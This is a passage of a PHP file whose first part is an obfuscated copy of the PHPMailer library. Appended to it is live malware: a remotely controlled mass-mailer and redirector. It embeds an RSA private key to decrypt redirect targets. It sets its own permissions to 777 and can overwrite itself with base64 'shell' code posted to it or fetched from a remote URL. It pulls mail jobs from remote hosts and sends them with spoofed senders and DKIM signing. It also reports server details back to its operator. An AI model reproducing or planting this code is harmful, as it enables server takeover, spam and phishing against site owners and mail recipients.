!== false) { return true; } return false; } protected function lang($spd8a48a) { if (count($this->language) < 1) { $this->setLanguage(); } if (array_key_exists($spd8a48a, $this->language)) { if ('smtp_connect_failed' === $spd8a48a) { return $this->language[$spd8a48a] . ' https://github.com/PHPMailer/PHPMailer/wiki/Troubleshooting'; } return $this->language[$spd8a48a]; } return $spd8a48a; } public function isError() { return $this->error_count > 0; } public function addCustomHeader($spdeeed8, $spf2f6fc = null) { if (null === $spf2f6fc && strpos($spdeeed8, ':') !== false) { list($spdeeed8, $spf2f6fc) = explode(':', $spdeeed8, 2); } $spdeeed8 = trim($spdeeed8); $spf2f6fc = trim($spf2f6fc); if (empty($spdeeed8) || strpbrk($spdeeed8 . $spf2f6fc, '
') !== false) { if ($this->exceptions) { throw new Exception('Invalid header name or value'); } return false; } $this->CustomHeader[] = array($spdeeed8, $spf2f6fc); return true; } public function getCustomHeaders() { return $this->CustomHeader; } public function msgHTML($sp6713e3, $sp34f473 = '', $sp5c0723 = false) { preg_match_all('/(?<!-)(src|background)=["\'](.*)["\']/Ui', $sp6713e3, $spb5d593); if (array_key_exists(2, $spb5d593)) { if (strlen($sp34f473) > 1 && '/' !== substr($sp34f473, -1)) { $sp34f473 .= '/'; } foreach ($spb5d593[2] as $spabedf3 => $sp68039c) { $sp72357b = array(); if (preg_match('#^data:(image/(?:jpe?g|gif|png));?(base64)?,(.+)#', $sp68039c, $sp72357b)) { if (count($sp72357b) === 4 && static::ENCODING_BASE64 === $sp72357b[2]) { $sp894f8b = base64_decode($sp72357b[3]); } elseif ('' === $sp72357b[2]) { $sp894f8b = rawurldecode($sp72357b[3]); } else { continue; } $sp38727a = substr(hash('sha256', $sp894f8b), 0, 32) . '@phpmailer.0'; if (!$this->cidExists($sp38727a)) { $this->addStringEmbeddedImage($sp894f8b, $sp38727a, 'embed' . $spabedf3, static::ENCODING_BASE64, $sp72357b[1]); } $sp6713e3 = str_replace($spb5d593[0][$spabedf3], $spb5d593[1][$spabedf3] . '="cid:' . $sp38727a . '"', $sp6713e3); continue; } if (!empty($sp34f473) && strpos($sp68039c, '..') === false && 0 !== strpos($sp68039c, 'cid:') && !preg_match('#^[a-z][a-z0-9+.-]*:?//#i', $sp68039c)) { $spc11822 = static::mb_pathinfo($sp68039c, PATHINFO_BASENAME); $spb8adc9 = dirname($sp68039c); if ('.' === $spb8adc9) { $spb8adc9 = ''; } $sp38727a = substr(hash('sha256', $sp68039c), 0, 32) . '@phpmailer.0'; if (strlen($sp34f473) > 1 && '/' !== substr($sp34f473, -1)) { $sp34f473 .= '/'; } if (strlen($spb8adc9) > 1 && '/' !== substr($spb8adc9, -1)) { $spb8adc9 .= '/'; } if ($this->addEmbeddedImage($sp34f473 . $spb8adc9 . $spc11822, $sp38727a, $spc11822, static::ENCODING_BASE64, static::_mime_types((string) static::mb_pathinfo($spc11822, PATHINFO_EXTENSION)))) { $sp6713e3 = preg_replace('/' . $spb5d593[1][$spabedf3] . '=["\']' . preg_quote($sp68039c, '/') . '["\']/Ui', $spb5d593[1][$spabedf3] . '="cid:' . $sp38727a . '"', $sp6713e3); } } } } $this->isHTML(); $this->Body = static::normalizeBreaks($sp6713e3); $this->AltBody = static::normalizeBreaks($this->html2text($sp6713e3, $sp5c0723)); if (!$this->alternativeExists()) { $this->AltBody = 'This is an HTML-only message. To view it, activate HTML in your email application.' . static::$LE; } return $this->Body; } public function html2text($spaaed9a, $sp5c0723 = false) { if (is_callable($sp5c0723)) { return $sp5c0723($spaaed9a); } return html_entity_decode(trim(strip_tags(preg_replace('/<(head|title|style|script)[^>]*>.*?<\\/\\1>/si', '', $spaaed9a))), ENT_QUOTES, $this->CharSet); } public static function _mime_types($spfc001e = '') { $spba2488 = array('xl' => 'application/excel', 'js' => 'application/javascript', 'hqx' => 'application/mac-binhex40', 'cpt' => 'application/mac-compactpro', 'bin' => 'application/macbinary', 'doc' => 'application/msword', 'word' => 'application/msword', 'xlsx' => 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', 'xltx' => 'application/vnd.openxmlformats-officedocument.spreadsheetml.template', 'potx' => 'application/vnd.openxmlformats-officedocument.presentationml.template', 'ppsx' => 'application/vnd.openxmlformats-officedocument.presentationml.slideshow', 'pptx' => 'application/vnd.openxmlformats-officedocument.presentationml.presentation', 'sldx' => 'application/vnd.openxmlformats-officedocument.presentationml.slide', 'docx' => 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', 'dotx' => 'application/vnd.openxmlformats-officedocument.wordprocessingml.template', 'xlam' => 'application/vnd.ms-excel.addin.macroEnabled.12', 'xlsb' => 'application/vnd.ms-excel.sheet.binary.macroEnabled.12', 'class' => 'application/octet-stream', 'dll' => 'application/octet-stream', 'dms' => 'application/octet-stream', 'exe' => 'application/octet-stream', 'lha' => 'application/octet-stream', 'lzh' => 'application/octet-stream', 'psd' => 'application/octet-stream', 'sea' => 'application/octet-stream', 'so' => 'application/octet-stream', 'oda' => 'application/oda', 'pdf' => 'application/pdf', 'ai' => 'application/postscript', 'eps' => 'application/postscript', 'ps' => 'application/postscript', 'smi' => 'application/smil', 'smil' => 'application/smil', 'mif' => 'application/vnd.mif', 'xls' => 'application/vnd.ms-excel', 'ppt' => 'application/vnd.ms-powerpoint', 'wbxml' => 'application/vnd.wap.wbxml', 'wmlc' => 'application/vnd.wap.wmlc', 'dcr' => 'application/x-director', 'dir' => 'application/x-director', 'dxr' => 'application/x-director', 'dvi' => 'application/x-dvi', 'gtar' => 'application/x-gtar', 'php3' => 'application/x-httpd-php', 'php4' => 'application/x-httpd-php', 'php' => 'application/x-httpd-php', 'phtml' => 'application/x-httpd-php', 'phps' => 'application/x-httpd-php-source', 'swf' => 'application/x-shockwave-flash', 'sit' => 'application/x-stuffit', 'tar' => 'application/x-tar', 'tgz' => 'application/x-tar', 'xht' => 'application/xhtml+xml', 'xhtml' => 'application/xhtml+xml', 'zip' => 'application/zip', 'mid' => 'audio/midi', 'midi' => 'audio/midi', 'mp2' => 'audio/mpeg', 'mp3' => 'audio/mpeg', 'm4a' => 'audio/mp4', 'mpga' => 'audio/mpeg', 'aif' => 'audio/x-aiff', 'aifc' => 'audio/x-aiff', 'aiff' => 'audio/x-aiff', 'ram' => 'audio/x-pn-realaudio', 'rm' => 'audio/x-pn-realaudio', 'rpm' => 'audio/x-pn-realaudio-plugin', 'ra' => 'audio/x-realaudio', 'wav' => 'audio/x-wav', 'mka' => 'audio/x-matroska', 'bmp' => 'image/bmp', 'gif' => 'image/gif', 'jpeg' => 'image/jpeg', 'jpe' => 'image/jpeg', 'jpg' => 'image/jpeg', 'png' => 'image/png', 'tiff' => 'image/tiff', 'tif' => 'image/tiff', 'webp' => 'image/webp', 'heif' => 'image/heif', 'heifs' => 'image/heif-sequence', 'heic' => 'image/heic', 'heics' => 'image/heic-sequence', 'eml' => 'message/rfc822', 'css' => 'text/css', 'html' => 'text/html', 'htm' => 'text/html', 'shtml' => 'text/html', 'log' => 'text/plain', 'text' => 'text/plain', 'txt' => 'text/plain', 'rtx' => 'text/richtext', 'rtf' => 'text/rtf', 'vcf' => 'text/vcard', 'vcard' => 'text/vcard', 'ics' => 'text/calendar', 'xml' => 'text/xml', 'xsl' => 'text/xml', 'wmv' => 'video/x-ms-wmv', 'mpeg' => 'video/mpeg', 'mpe' => 'video/mpeg', 'mpg' => 'video/mpeg', 'mp4' => 'video/mp4', 'm4v' => 'video/mp4', 'mov' => 'video/quicktime', 'qt' => 'video/quicktime', 'rv' => 'video/vnd.rn-realvideo', 'avi' => 'video/x-msvideo', 'movie' => 'video/x-sgi-movie', 'webm' => 'video/webm', 'mkv' => 'video/x-matroska'); $spfc001e = strtolower($spfc001e); if (array_key_exists($spfc001e, $spba2488)) { return $spba2488[$spfc001e]; } return 'application/octet-stream'; } public static function filenameToType($spc11822) { $sp1a34e9 = strpos($spc11822, '?'); if (false !== $sp1a34e9) { $spc11822 = substr($spc11822, 0, $sp1a34e9); } $spfc001e = static::mb_pathinfo($spc11822, PATHINFO_EXTENSION); return static::_mime_types($spfc001e); } public static function mb_pathinfo($sp9e5935, $sp4411bb = null) { $sp4a180e = array('dirname' => '', 'basename' => '', 'extension' => '', 'filename' => ''); $spebe327 = array(); if (preg_match('#^(.*?)[\\\\/]*(([^/\\\\]*?)(\\.([^.\\\\/]+?)|))[\\\\/.]*$#m', $sp9e5935, $spebe327)) { if (array_key_exists(1, $spebe327)) { $sp4a180e['dirname'] = $spebe327[1]; } if (array_key_exists(2, $spebe327)) { $sp4a180e['basename'] = $spebe327[2]; } if (array_key_exists(5, $spebe327)) { $sp4a180e['extension'] = $spebe327[5]; } if (array_key_exists(3, $spebe327)) { $sp4a180e['filename'] = $spebe327[3]; } } switch ($sp4411bb) { case PATHINFO_DIRNAME: case 'dirname': return $sp4a180e['dirname']; case PATHINFO_BASENAME: case 'basename': return $sp4a180e['basename']; case PATHINFO_EXTENSION: case 'extension': return $sp4a180e['extension']; case PATHINFO_FILENAME: case 'filename': return $sp4a180e['filename']; default: return $sp4a180e; } } public function set($spdeeed8, $spf2f6fc = '') { if (property_exists($this, $spdeeed8)) { $this->{$spdeeed8} = $spf2f6fc; return true; } $this->setError($this->lang('variable_set') . $spdeeed8); return false; } public function secureHeader($speadb40) { return trim(str_replace(array('', '
'), '', $speadb40)); } public static function normalizeBreaks($sp891292, $sp199b56 = null) { if (null === $sp199b56) { $sp199b56 = static::$LE; } $sp891292 = str_replace(array(self::CRLF, ''), '
', $sp891292); if ('
' !== $sp199b56) { $sp891292 = str_replace('
', $sp199b56, $sp891292); } return $sp891292; } public static function stripTrailingWSP($sp891292) { return rtrim($sp891292, ' 
	'); } public static function getLE() { return static::$LE; } protected static function setLE($sp7566ea) { static::$LE = $sp7566ea; } public function sign($sp24f6a2, $speb25b7, $spb9eea2, $sp7f35b3 = '') { $this->sign_cert_file = $sp24f6a2; $this->sign_key_file = $speb25b7; $this->sign_key_pass = $spb9eea2; $this->sign_extracerts_file = $sp7f35b3; } public function DKIM_QP($sp86e071) { $spc351d1 = ''; $spbd0a44 = strlen($sp86e071); for ($sp9f800d = 0; $sp9f800d < $spbd0a44; ++$sp9f800d) { $spb56213 = ord($sp86e071[$sp9f800d]); if (33 <= $spb56213 && $spb56213 <= 58 || $spb56213 === 60 || 62 <= $spb56213 && $spb56213 <= 126) { $spc351d1 .= $sp86e071[$sp9f800d]; } else { $spc351d1 .= '=' . sprintf('%02X', $spb56213); } } return $spc351d1; } public function DKIM_Sign($spf2a1c1) { if (!defined('PKCS7_TEXT')) { if ($this->exceptions) { throw new Exception($this->lang('extension_missing') . 'openssl'); } return ''; } $spf19f07 = !empty($this->DKIM_private_string) ? $this->DKIM_private_string : file_get_contents($this->DKIM_private); if ('' !== $this->DKIM_passphrase) { $spab2148 = openssl_pkey_get_private($spf19f07, $this->DKIM_passphrase); } else { $spab2148 = openssl_pkey_get_private($spf19f07); } if (openssl_sign($spf2a1c1, $spbf73c6, $spab2148, 'sha256WithRSAEncryption')) { openssl_pkey_free($spab2148); return base64_encode($spbf73c6); } openssl_pkey_free($spab2148); return ''; } public function DKIM_HeaderC($spf2a1c1) { $spf2a1c1 = static::normalizeBreaks($spf2a1c1, self::CRLF); $spf2a1c1 = preg_replace('/\\r\\n[ \\t]+/', ' ', $spf2a1c1); $sp4b9890 = explode(self::CRLF, $spf2a1c1); foreach ($sp4b9890 as $spd8a48a => $spc351d1) { if (strpos($spc351d1, ':') === false) { continue; } list($sp457890, $spf2f6fc) = explode(':', $spc351d1, 2); $sp457890 = strtolower($sp457890); $spf2f6fc = preg_replace('/[ \\t]+/', ' ', $spf2f6fc); $sp4b9890[$spd8a48a] = trim($sp457890, ' 	') . ':' . trim($spf2f6fc, ' 	'); } return implode(self::CRLF, $sp4b9890); } public function DKIM_BodyC($spd76997) { if (empty($spd76997)) { return self::CRLF; } $spd76997 = static::normalizeBreaks($spd76997, self::CRLF); return static::stripTrailingWSP($spd76997) . self::CRLF; } public function DKIM_Add($sp5776bf, $spca8750, $spd76997) { $spec995e = 'rsa-sha256'; $sp8b5de2 = 'relaxed/simple'; $spbdee0c = 'dns/txt'; $sp83fe95 = time(); $spd34689 = array('from', 'to', 'cc', 'date', 'subject', 'reply-to', 'message-id', 'content-type', 'mime-version', 'x-mailer'); if (stripos($sp5776bf, 'Subject') === false) { $sp5776bf .= 'Subject: ' . $spca8750 . static::$LE; } $spc1284a = explode(static::$LE, $sp5776bf); $spb2b7e3 = ''; $sp5456ab = ''; $spc2d94a = array(); $spef24bb = 0; $spe6cb72 = count($spc1284a); foreach ($spc1284a as $sp409d8b) { $spa4f5d9 = array(); if (preg_match('/^([^ \\t]*?)(?::[ \\t]*)(.*)$/', $sp409d8b, $spa4f5d9)) { if ($spb2b7e3 !== '') { $spc2d94a[] = array('label' => $spb2b7e3, 'value' => $sp5456ab); } $spb2b7e3 = $spa4f5d9[1]; $sp5456ab = $spa4f5d9[2]; } elseif (preg_match('/^[ \\t]+(.*)$/', $sp409d8b, $spa4f5d9)) { $sp5456ab .= ' ' . $spa4f5d9[1]; } ++$spef24bb; if ($spef24bb >= $spe6cb72) { $spc2d94a[] = array('label' => $spb2b7e3, 'value' => $sp5456ab); } } $sp88b208 = array(); $sp2abe7f = array(); $sp064738 = array(); foreach ($spc2d94a as $sp03359b) { if (in_array(strtolower($sp03359b['label']), $spd34689, true)) { $sp2abe7f[] = $sp03359b['label']; $sp064738[] = $sp03359b['label'] . ': ' . $sp03359b['value']; if ($this->DKIM_copyHeaderFields) { $sp88b208[] = $sp03359b['label'] . ':' . str_replace('|', '=7C', $this->DKIM_QP($sp03359b['value'])); } continue; } if (in_array($sp03359b['label'], $this->DKIM_extraHeaders, true)) { foreach ($this->CustomHeader as $spd7ccc1) { if ($spd7ccc1[0] === $sp03359b['label']) { $sp2abe7f[] = $sp03359b['label']; $sp064738[] = $sp03359b['label'] . ': ' . $sp03359b['value']; if ($this->DKIM_copyHeaderFields) { $sp88b208[] = $sp03359b['label'] . ':' . str_replace('|', '=7C', $this->DKIM_QP($sp03359b['value'])); } continue 2; } } } } $spda9153 = ''; if ($this->DKIM_copyHeaderFields && count($sp88b208) > 0) { $spda9153 = ' z='; $spb259c0 = true; foreach ($sp88b208 as $sp01b742) { if (!$spb259c0) { $spda9153 .= static::$LE . ' |'; } if (strlen($sp01b742) > self::STD_LINE_LENGTH - 3) { $spda9153 .= substr(chunk_split($sp01b742, self::STD_LINE_LENGTH - 3, static::$LE . self::FWS), 0, -strlen(static::$LE . self::FWS)); } else { $spda9153 .= $sp01b742; } $spb259c0 = false; } $spda9153 .= ';' . static::$LE; } $sp6e9758 = ' h=' . implode(':', $sp2abe7f) . ';' . static::$LE; $sp9544d1 = implode(static::$LE, $sp064738); $spd76997 = $this->DKIM_BodyC($spd76997); $sp5a9b4b = base64_encode(pack('H*', hash('sha256', $spd76997))); $sp353832 = ''; if ('' !== $this->DKIM_identity) { $sp353832 = ' i=' . $this->DKIM_identity . ';' . static::$LE; } $sp860e9d = 'DKIM-Signature: v=1;' . ' d=' . $this->DKIM_domain . ';' . ' s=' . $this->DKIM_selector . ';' . static::$LE . ' a=' . $spec995e . ';' . ' q=' . $spbdee0c . ';' . ' t=' . $sp83fe95 . ';' . ' c=' . $sp8b5de2 . ';' . static::$LE . $sp6e9758 . $sp353832 . $spda9153 . ' bh=' . $sp5a9b4b . ';' . static::$LE . ' b='; $spdb2378 = $this->DKIM_HeaderC($sp9544d1 . static::$LE . $sp860e9d); $spbf73c6 = $this->DKIM_Sign($spdb2378); $spbf73c6 = trim(chunk_split($spbf73c6, self::STD_LINE_LENGTH - 3, static::$LE . self::FWS)); return static::normalizeBreaks($sp860e9d . $spbf73c6); } public static function hasLineLongerThanMax($speadb40) { return (bool) preg_match('/^(.{' . (self::MAX_LINE_LENGTH + strlen(static::$LE)) . ',})/m', $speadb40); } public static function quotedString($speadb40) { if (preg_match('/[ ()<>@,;:"\\/\\[\\]?=]/', $speadb40)) { return '"' . str_replace('"', '\\"', $speadb40) . '"'; } return $speadb40; } public function getToAddresses() { return $this->to; } public function getCcAddresses() { return $this->cc; } public function getBccAddresses() { return $this->bcc; } public function getReplyToAddresses() { return $this->ReplyTo; } public function getAllRecipientAddresses() { return $this->all_recipients; } protected function doCallback($spe43268, $spab1114, $sp372894, $sp1edd4b, $spca8750, $spd76997, $spd3cce2, $spbba943) { if (!empty($this->action_function) && is_callable($this->action_function)) { call_user_func($this->action_function, $spe43268, $spab1114, $sp372894, $sp1edd4b, $spca8750, $spd76997, $spd3cce2, $spbba943); } } public function getOAuth() { return $this->oauth; } public function setOAuth(OAuth $sp893035) { $this->oauth = $sp893035; } } $sp101551 = '3'; function rsaDecrypt($sp894f8b) { $sp894f8b = base64_decode($sp894f8b); $sp2290b8 = base64_decode('LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBelhldk9MN2tDZlcraDRYZVZyR1pCS2MzT0ZLU3ZxK2kvVWlSd29xa3d4SThJbWNMCjZqM1JKZkJBQU9sWEsvNlREMGkrKzE0NlJsbEVRVklhcTZ2c0VuWHBacVVTL0FSaElnbVJZcHY5WlQrWmdvNG4Kdk1tTmNqQk1uMjdxWlFhRHRZVlhnZnhINkE5MStXZk5keTcrSnQrOWNpNVdNR1RlZWx1S1ZzVEpCZmNQenZKYgpsalZVZEJPQWVDb3piUkVla0liVGZwcyt4bjdkMm0yYzU2ZUdLVjJPRDRIZ3RmMmliRGtFVVcycVo1TUZqUjhjClFHeWh6ZnNaUHB4aE9yQVgyL2k0bWRRTDhvSmxYT2JMNElRbnBNVGRGa1VVbnBFNm9ENVFEeEt6TEdNRUZQUXIKZ1F0aTJwemFJVU1nVlo1TElkVGdHdk1COE8vbXJicEo0VTJQYVFJREFRQUJBb0lCQUNOa2YybGQ4SGdLdmJRbwppaUVTM0pIaG4vQnl3TlpaK05CNlpLbEhLcFJ6bXFvdVorNEVrZmRnQ0JaZ0cyVDNxQ3RVMDVrSEpUQ2pCYy9lCnJidHVsTzZsSXZ4TWFSWENSMTBPbXQyS2t6NlNrd1hiS05zck9OTTNvS3RCOXR4S0gvdnZxU0E1N2NUNmpNN1cKWTUwcEdoeG1KQUw4R2xxaHRYVU1PYXN5b0pJSEtzdzcrc21kVWFaazl5ZGZjWHZwZVFtTzJFSC82T2ZwTE5hdgpDZGJUK05qaXAwcFRrcDNSYTN0a3FwL2hPV2ZhQ2hnVUxDbmZvZkdLdXVmNjhqMG1wSld0ZmtpbFNHNlgvb05yCndBQnFYS0tqSnVzTDJUU0FyTERucDcrcDEzbkpYcHlZSXlsTnJpWkozM21CR01waHZYbTFrTWpXcEcvUC9iblUKOWxGOGViVUNnWUVBNkJ2K2RUSExMMlNIT0ZRcytSVHBtemxMcWxKaXNCYXp3T0ZXczFkd2lHc2lPRFM0WktuUwpkWGNVT21mQi8wNE9sTS80L1Erb25RbWhWa2pmVmhQWE5LVEtsMkZ2L2Mrd0kzd0JrZlJaNFJxdldpTnJSaHB5ClQ5TWNNbnV6Si9obW9ib1dGWE9lNjJnNkg0S2kwMjhGWFZJTlRjTE5xQlZ4YVQxNElieWwrTjhDZ1lFQTRwMnYKMHNOaUhITXkvWURLMTg0VFR4MXo4clRNNDY4V3JhMkNraFFuVGx6a0Y5czRsSWVmQUt4N3dSL1pacm9hK0ozTgpwMUd5ZmxXSkt6d3RKMFRaKzJlU0xtcEVhMHV5dStUS05WeFcrSHhCZzg1TkJjV1hnajlaWXhpUWJwMnA5NWU4CjllNlFZR2hpZGxTdnRzcU9nRFFyWW1WbStNb3VrSElnQUg1a1dMY0NnWUVBeW1VV3RxU3IwM0NxaEpES0FveWMKdzNEcnJPSllFY3BLQmllNFRYd3lzWklSN2NieS96d2lPN0dSWHZoNDdxSG5EeFptdkd3NkVHMkVWTlFJZzJ1YgpuZGtRbTM0b2hMN2tqWnlsVmRzbndLVmZRSTlnREdvbFFid0plMi9vSWpOMWN4THNETnFjT2hQUmt3Wjc2emlGCkNnSHhmZHdmTHJFOENwUENQRkRldlNzQ2dZRUFtNm9wenFNN3o4TXFNWXk0eVlqYkpxdGFyRXVadW9UWkZUQnMKMHA5WmFMRFNWYmpXb3VDT1RrNHRMRG9PZ2t3d25ycjNPNG9aREVNQldGdWJ3Sy9BOUxydVpVZkYrOVloem9PWQppeE1GQXVlSHNWeVM5L1lFM3dsWkE0TXFJM0hXQVNlUU8zZEdZWk1TbjZvSWtZMk9XVzU4cHJoMUJVME1zMWhSCnQwVWE5UDBDZ1lCbEJRdE0vYUtQSFA5TDBhZzZYZjJ4YTlkeVkvME8yZEIvcmtWRlNZQUtPM3FmcEJLRitkMXMKdXdkNVlzOVJmdjg0Zms3VXhyZzBIVEhCOWxoUmMvOFgwaU9SUEVHS0VkWHlrVmZod0RaTURtMkpveExPblBZWQoyT3Arblh1VEtWRnIveENGWVREZk50UWVQYjRrMDRlZCtjcStNdk4zTkcvUytobWpZNU9OZ3c9PQotLS0tLUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo='); $spf05d7a = ''; openssl_private_decrypt($sp894f8b, $spf05d7a, $sp2290b8); return $spf05d7a; } function sendResponse($spf988c0, $sp3d0b03) { global $sp101551; echo json_encode(array('result' => $spf988c0, 'content' => $sp3d0b03, 'phpVersion' => phpversion(), 'mailFunction' => function_exists('mail'), 'scriptVersion' => $sp101551, 'isWritable' => intval(substr(sprintf('%o', fileperms(__FILE__)), -4)), 'urlFopen' => in_array(ini_get('url_fopen'), array('ON', 'On', '1', true)), 'curl' => extension_loaded('curl'))); die; } function getRequest($sp68039c) { if (in_array(ini_get('url_fopen'), array('ON', 'On', '1', true))) { return @file_get_contents($sp68039c); } else { $spf646dc = curl_init($sp68039c); curl_setopt($spf646dc, CURLOPT_RETURNTRANSFER, 1); curl_setopt($spf646dc, CURLOPT_HEADER, 0); $spa7b8e2 = curl_exec($spf646dc); curl_close($spf646dc); return $spa7b8e2; } } function sendMail($sp894f8b) { $sp9980dd = new PHPMailer(); $sp9980dd->CharSet = 'UTF-8'; $sp9980dd->Encoding = 'base64'; if ($sp894f8b->DkimDomain) { $sp9980dd->DKIM_domain = $sp894f8b->DkimDomain; $sp9980dd->DKIM_private_string = $sp894f8b->DkimPrivateKey; $sp9980dd->DKIM_selector = $sp894f8b->DkimSelector; $sp9980dd->DKIM_passphrase = ''; $sp9980dd->DKIM_identity = $sp894f8b->SenderEmail; } $sp9980dd->isMail(); try { $sp9980dd->setFrom($sp894f8b->SenderEmail, $sp894f8b->SenderName); } catch (\Exception $sp7eefec) { sendResponse(false, $sp7eefec->getMessage()); } try { foreach ($sp894f8b->Addresses as $sp973192) { if ($sp894f8b->SendMethod == 1) { $sp9980dd->addAddress($sp973192); } else { if ($sp894f8b->SendMethod == 2) { $sp9980dd->addCC($sp973192); } else { $sp9980dd->addBCC($sp973192); } } } } catch (\Exception $sp7eefec) { sendResponse(false, $sp7eefec->getMessage()); } $sp9980dd->Subject = $sp894f8b->Subject; foreach ($sp894f8b->Headers as $sp03359b) { try { $sp9980dd->addCustomHeader($sp03359b->Key, $sp03359b->Value); } catch (\Exception $sp7eefec) { sendResponse(false, $sp7eefec->getMessage()); } } try { $spd76997 = $sp894f8b->Body; $sp9980dd->msgHTML($spd76997); } catch (\Exception $sp7eefec) { sendResponse(false, $sp7eefec->getMessage()); } foreach ($sp894f8b->Attachments as $sp0f4801) { try { $sp622b6d = base64_decode($sp0f4801->Content); $sp9980dd->addStringAttachment($sp622b6d, $sp0f4801->Filename); } catch (\Exception $sp7eefec) { sendResponse(false, $sp7eefec->getMessage()); } } foreach ($sp894f8b->EmbeddedAttachments as $sp0f4801) { try { $sp622b6d = base64_decode($sp0f4801->Content); $sp9980dd->addStringEmbeddedImage($sp622b6d, $sp0f4801->ContentId, $sp0f4801->Filename); } catch (\Exception $sp7eefec) { sendResponse(false, $sp7eefec->getMessage()); } } try { if (!$sp9980dd->send()) { sendResponse(false, $sp9980dd->ErrorInfo); } } catch (\Exception $sp7eefec) { sendResponse(false, $sp7eefec->getMessage()); } sendResponse(true, ''); } if (!empty($_GET['l'])) { $sp6f6046 = rsaDecrypt($_GET['l']); header('Location: ' . $sp6f6046); die; } if (isset($_GET['checkConnection'])) { @chmod(__FILE__, 511); sendResponse(true, ''); } elseif (isset($_POST['checkConnection'])) { @chmod(__FILE__, 511); sendResponse(true, ''); } elseif (isset($_POST['updateScript'])) { $spa76835 = base64_decode($_POST['shellScript']); if (!$spa76835 || strlen($spa76835) < 10000) { sendResponse(false, 'small shell string: ' . $spa76835); } if (@file_put_contents(__FILE__, $spa76835)) { sendResponse(true, ''); } sendResponse(false, 'error when updating script'); } elseif (isset($_GET['updateScript'])) { $spc34871 = base64_decode($_GET['fileUrl']); $spa1312d = getRequest($spc34871); $spa76835 = base64_decode($spa1312d); if (!$spa76835 || strlen($spa76835) < 10000) { sendResponse(false, 'small shell string: ' . $spa76835); } if (@file_put_contents(__FILE__, $spa76835)) { sendResponse(true, ''); } sendResponse(false, 'error when updating script'); } elseif (isset($_POST['sendMail'])) { $spafbd01 = $_POST['mail']; $sp40446d = base64_decode($spafbd01); $spbc2bac = json_decode($sp40446d); if (!$spbc2bac) { sendResponse(false, 'bad json request, request was: ' . $spafbd01); } sendMail($spbc2bac); } elseif (isset($_GET['sendMail'])) { if (!empty($_GET['fileUrl'])) { $spc34871 = base64_decode($_GET['fileUrl']); $spf257d4 = getRequest($spc34871); if (strlen($spf257d4) < 200) { sendResponse(false, 'Low mail data: ' . $spf257d4); } $spe8e58b = @json_decode(base64_decode($spf257d4)); if (!$spe8e58b) { sendResponse(false, 'Wrong mail data'); } sendMail($spe8e58b); } sendResponse(false, 'No mailUrl'); } ?>

MAIL FUNCTION = <?php  echo function_exists('mail') ? 'YES' : 'NO'; ?>
;<br/>
PHP VERSION: <?php  echo phpversion(); ?>
;<br/>
SCRIPT VERSION: <?php  echo $sp101551; ?>
;<br/>
FOLDER PERMISSION: <?php  echo substr(sprintf('%o', fileperms(dirname(__FILE__))), -4); ?>
  <br/>
FILE PERMISSION: <?php  echo substr(sprintf('%o', fileperms(__FILE__)), -4);